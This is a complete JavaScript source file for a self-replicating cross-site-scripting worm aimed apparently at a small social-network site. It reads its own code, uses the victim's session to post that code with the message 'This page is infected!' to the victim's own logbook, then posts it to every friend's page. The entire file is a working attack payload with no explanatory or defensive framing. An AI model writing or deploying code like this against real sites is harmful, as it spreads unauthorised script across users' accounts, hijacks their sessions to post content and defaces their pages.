var theWorm = document.currentScript;

var self = new XMLHttpRequest();
self.open('GET', 'mypage.html', true);

//infecting itself
self.onreadystatechange = function () {
	if (self.readyState === 4) {
		if (self.status == 200){
			var el = document.createElement( 'html' );
			el.innerHTML = self.response;                        
			var infect = new XMLHttpRequest();		
			//use profile pic to get id	
			infect.open('POST', 'post' + el.querySelector('#profileImage').src.split('/').slice(-2)[0] + '.html', true);
			
			//post on logbook
			var formData = new FormData();
			formData.append('entry', 'This page is infected!<script>' + theWorm.innerHTML + '<\/script>');

			infect.send(formData);
		}
	}
}
self.send();

var friend = new XMLHttpRequest();
friend.open('GET', 'myfriends.html', true);

//infecting friends

friend.onreadystatechange = function () {
	if (friend.readyState === 4) {
		if (friend.status == 200){
			var el = document.createElement( 'html' );
			el.innerHTML = friend.response;

			//using friend images to get ids
			el.querySelectorAll('.Image a').forEach(function (e){
				
				var infect = new XMLHttpRequest();
				infect.open('POST', e.href.split('/').slice(-1)[0].replace('profile','post'), true);
				
				//post on logbook
				var formData = new FormData();
				formData.append('entry', 'This page is infected!<script>' + theWorm.innerHTML + '<\/script>');

				infect.send(formData);
			});
		}
	}
}

friend.send();